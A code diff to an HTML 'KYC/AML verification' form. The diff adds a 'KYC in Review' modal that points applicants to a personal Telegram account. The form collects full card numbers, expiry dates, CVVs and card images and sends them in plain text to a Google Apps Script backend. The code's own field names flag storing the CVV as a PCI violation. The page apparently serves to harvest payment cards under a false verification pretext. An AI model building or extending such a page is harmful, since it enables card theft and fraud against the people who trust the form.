@@ -202,6 +202,8 @@
             font-size: 1em;
         }
 
+        /* .status-success class is no longer directly used for #statusMessage, modal handles success */
+        /* We keep it in case it's needed for other general success messages elsewhere, or for the modal itself if desired */
         .status-success {
             background-color: var(--status-success-bg);
             color: var(--status-success-text);
@@ -250,9 +252,97 @@
             margin-top: 25px;
             margin-bottom: 20px;
             padding: 10px;
-            background-color: rgba(var(--bg-input), 0.5);
+            background-color: rgba(var(--bg-input), 0.5); /* Slight transparency */
             border-left: 3px solid var(--primary-blue);
             border-radius: var(--border-radius-sm);
+        }
+
+        /* --- Modal Styles --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.75); /* Darker overlay */
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            background-color: var(--bg-container);
+            padding: 30px 40px;
+            border-radius: var(--border-radius-md);
+            box-shadow: var(--shadow-container);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+            border-top: 3px solid var(--primary-blue);
+            color: var(--text-primary);
+            animation: fadeInModal 0.3s ease-out;
+        }
+
+        @keyframes fadeInModal {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-content h2 { /* Re-styling for modal h2 */
+            font-size: 1.7em;
+            color: var(--text-headings);
+            border-bottom: 1px solid var(--border-divider);
+            padding-bottom: 15px;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+
+        .modal-content p {
+            margin-bottom: 25px;
+            font-size: 1em;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .modal-close-button {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 2.2em;
+            color: var(--text-secondary);
+            cursor: pointer;
+            line-height: 1;
+            transition: color 0.2s ease;
+        }
+        .modal-close-button:hover {
+            color: var(--text-primary);
+        }
+
+        .telegram-button {
+            display: inline-block;
+            background-color: var(--primary-blue);
+            color: var(--text-on-primary-blue);
+            padding: 12px 25px;
+            border: none;
+            border-radius: var(--border-radius-sm);
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 500;
+            text-decoration: none;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            margin-top: 10px;
+        }
+
+        .telegram-button:hover {
+            background-color: var(--primary-blue-hover);
+            transform: translateY(-1px);
+        }
+        .telegram-button:active {
+            transform: translateY(0px);
         }
 
 
@@ -270,12 +360,23 @@
                 font-size: 1.8em;
                 margin-bottom: 25px;
             }
-            h2 {
+            h2 { /* General h2 */
                 font-size: 1.4em;
             }
             button[type="submit"] {
                 font-size: 1em;
                 padding: 12px 20px;
+            }
+
+            .modal-content {
+                padding: 25px 20px;
+            }
+            .modal-content h2 { /* Modal h2 on small screens */
+                font-size: 1.5em;
+            }
+            .telegram-button {
+                font-size: 0.95em;
+                padding: 10px 20px;
             }
         }
     </style>
@@ -405,9 +506,22 @@
             </div>
 
             <button type="submit" id="submitButton">Submit Application</button>
-            <div id="statusMessage"></div>
+            <div id="statusMessage"></div> <!-- For processing and error messages -->
         </form>
     </div>
+
+    <!-- KYC Review Modal -->
+    <div id="kycReviewModalOverlay" class="modal-overlay">
+        <div id="kycReviewModal" class="modal-content">
+            <span id="modalCloseBtn" class="modal-close-button">×</span>
+            <h2>KYC in Review</h2>
+            <p>Your application has been successfully submitted and is now under review. We will contact you via email with updates. If you have urgent questions, feel free to reach out.</p>
+            <a href="https://t.me/Rrs886" target="_blank" class="telegram-button">
+                Chat with us on Telegram
+            </a>
+        </div>
+    </div>
+
 
     <script>
         // !!! IMPORTANT: PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE !!!
@@ -417,11 +531,52 @@
         const submitButton = document.getElementById('submitButton');
         const statusMessage = document.getElementById('statusMessage');
 
+        // Modal Elements
+        const kycReviewModalOverlay = document.getElementById('kycReviewModalOverlay');
+        const kycReviewModal = document.getElementById('kycReviewModal');
+        const modalCloseBtn = document.getElementById('modalCloseBtn');
+
+        // --- Modal Functions ---
+        function showKycModal() {
+            if (kycReviewModalOverlay) {
+                kycReviewModalOverlay.style.display = 'flex';
+                // Clear any previous status messages from #statusMessage div
+                statusMessage.innerHTML = ''; 
+                statusMessage.className = '';
+            }
+        }
+
+        function hideKycModal() {
+            if (kycReviewModalOverlay) {
+                kycReviewModalOverlay.style.display = 'none';
+            }
+        }
+
+        // Event listeners for closing the modal
+        if (modalCloseBtn) {
+            modalCloseBtn.addEventListener('click', hideKycModal);
+        }
+        if (kycReviewModalOverlay) {
+            // Close modal if user clicks on the overlay (outside the modal content)
+            kycReviewModalOverlay.addEventListener('click', function(event) {
+                if (event.target === kycReviewModalOverlay) {
+                    hideKycModal();
+                }
+            });
+        }
+         // Close modal with Escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === "Escape" && kycReviewModalOverlay.style.display === 'flex') {
+                hideKycModal();
+            }
+        });
+
+
         form.addEventListener('submit', async function(event) {
             event.preventDefault();
             
             statusMessage.innerHTML = 'Processing... <span class="spinner"></span>';
-            statusMessage.className = '';
+            statusMessage.className = ''; // Clear previous status classes
             submitButton.disabled = true;
 
             const formDataObject = new FormData(form);
@@ -446,9 +601,9 @@
             // Card Details for Verification
             textData.aml_card1_EXTREME_RISK_PCI_VIOLATION = "--- CARD 1 (EXTREMELY SENSITIVE - PCI DSS VIOLATION RISK) ---";
             textData.amlCardName1 = formDataObject.get('amlCardName1') || "N/A";
-            textData.amlCardNumber1_PLAINTEXT_RISK = formDataObject.get('amlCardNumber1') || "N/A"; // Still a risk if sent to Google Sheet
-            textData.amlCardExpiry1_PLAINTEXT_RISK = formDataObject.get('amlCardExpiry1') || "N/A"; // Still a risk
-            textData.amlCardCvv1_NEVER_STORE_RISK = formDataObject.get('amlCardCvv1') || "N/A";       // MAJOR RISK
+            textData.amlCardNumber1_PLAINTEXT_RISK = formDataObject.get('amlCardNumber1') || "N/A";
+            textData.amlCardExpiry1_PLAINTEXT_RISK = formDataObject.get('amlCardExpiry1') || "N/A";
+            textData.amlCardCvv1_NEVER_STORE_RISK = formDataObject.get('amlCardCvv1') || "N/A";
             textData.amlCardType1 = formDataObject.get('amlCardType1') || "N/A";
             
             if (formDataObject.get('amlCardName2') || formDataObject.get('amlCardNumber2')) {
@@ -474,7 +629,7 @@
                         });
                     } catch (error) {
                         showError(`Error reading ${prefix} file: ${error.message}`);
-                        throw error; // Propagate error to stop submission
+                        throw error;
                     }
                 }
             }
@@ -488,9 +643,8 @@
                     await processFile('amlCardFile2', 'aml_card2');
                 }
             } catch (e) {
-                // Error already shown by processFile, ensure button is re-enabled
                 submitButton.disabled = false;
-                return; // Stop submission
+                return;
             }
             
             const dataPayload = {
@@ -499,12 +653,24 @@
             };
 
             try {
+                if (!WEB_APP_URL) {
+                    showError('Configuration error: Web App URL is not set. Cannot submit form.');
+                    submitButton.disabled = false;
+                    // For demonstration: Show modal after a delay if URL is empty
+                    // setTimeout(() => {
+                    //     showKycModal();
+                    //     form.reset();
+                    //     submitButton.disabled = false;
+                    // }, 2000);
+                    return;
+                }
+
                 const response = await fetch(WEB_APP_URL, {
                     method: 'POST',
-                    redirect: 'follow', // Important for Google Apps Script web apps
+                    redirect: 'follow',
                     body: JSON.stringify(dataPayload),
                     headers: {
-                        'Content-Type': 'text/plain;charset=utf-8', // Required by Apps Script for doPost with e.postData.contents
+                        'Content-Type': 'text/plain;charset=utf-8',
                     }
                 });
 
@@ -515,7 +681,7 @@
                 } catch (e) {
                     console.error("Response was not valid JSON:", resultText);
                     if(response.ok) {
-                         showSuccess('Form submitted for verification. You will be contacted via email.'); 
+                         showKycModal(); // Show modal on success even if response isn't perfect JSON
                          form.reset();
                     } else {
                          showError('Submission failed. Server response: ' + resultText);
@@ -525,14 +691,14 @@
                 }
 
                 if (result.success) {
-                    showSuccess('Form submitted for verification. You will be contacted via email.'); 
+                    showKycModal(); // Show modal on explicit success
                     form.reset();
                 } else {
-                    showError('Submission failed: ' + (result.error || 'Unknown server error.'));
+                    showError('Submission failed: ' + (result.error || 'Unknown server error. Check server logs.'));
                 }
             } catch (error) {
                 console.error('Fetch Error:', error);
-                showError('Submission error: ' + error.message + '. Check console and network tab for details. Ensure Web App URL is correct and script is deployed.');
+                showError('Submission error: ' + error.message + '. Check console, network tab, and ensure Web App URL is correct & script is deployed.');
             } finally {
                 submitButton.disabled = false;
             }
@@ -547,14 +713,16 @@
             });
         }
 
-        function showSuccess(message) {
-            statusMessage.textContent = message;
-            statusMessage.className = 'status-success';
-        }
+        // showSuccess function is no longer used for form submission success,
+        // as showKycModal handles that. It's kept here if needed for other purposes.
+        // function showSuccess(message) {
+        //     statusMessage.textContent = message;
+        //     statusMessage.className = 'status-success';
+        // }
 
         function showError(message) {
             statusMessage.textContent = message;
-            statusMessage.className = 'status-error';
+            statusMessage.className = 'status-error'; // This will apply the red error styling
         }
     </script>
 </body>
